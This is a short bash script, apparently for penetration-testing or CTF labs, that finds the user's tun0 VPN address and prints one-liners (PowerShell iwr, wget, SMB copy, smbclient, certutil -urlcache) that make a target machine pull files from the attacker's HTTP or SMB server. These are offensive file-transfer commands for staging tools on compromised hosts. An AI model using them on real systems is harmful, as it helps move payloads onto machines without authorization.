#!/usr/bin/env bash

if [ "$#" -lt 2 ]; then
  echo "Usage: download <http|smb|certutil> <os/path> [output_name]"
  exit 1
fi

PROTO="$1"
PATH_INPUT="$2"
OS=${PATH_INPUT%%/*}
FILE="$PATH_INPUT"
OUTFILE="${3:-$(basename "$FILE")}"

HTTP_PORT=8001

IP_ADDR=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$IP_ADDR" ]; then
  echo "Could not determine tun0 IP"
  exit 1
fi

case "$PROTO" in
  http)
    case "$OS" in
      windows)
        echo "iwr -uri http://${IP_ADDR}:${HTTP_PORT}/${FILE} -OutFile ${OUTFILE}"
        ;;
      linux)
        echo "wget http://${IP_ADDR}:${HTTP_PORT}/${FILE} -O ${OUTFILE}"
        ;;
      *)
        echo "OS must be windows or linux"
        exit 1
        ;;
    esac
    ;;
  smb)
    case "$OS" in
      windows)
        echo "copy \\\\${IP_ADDR}\\share\\${FILE} ${OUTFILE}"
        ;;
      linux)
        echo "smbclient \\\\${IP_ADDR}\\share -N -c \"get ${FILE} ${OUTFILE}\""
        ;;
      *)
        echo "OS must be windows or linux"
        exit 1
        ;;
    esac
    ;;
  certutil)
    case "$OS" in
      windows)
        echo "certutil.exe -urlcache -f http://${IP_ADDR}:${HTTP_PORT}/${FILE} ${OUTFILE}"
        ;;
      *)
        echo "certutil is only supported for windows"
        exit 1
        ;;
    esac
    ;;
  *)
    echo "Protocol must be http, smb, or certutil"
    exit 1
    ;;
esac
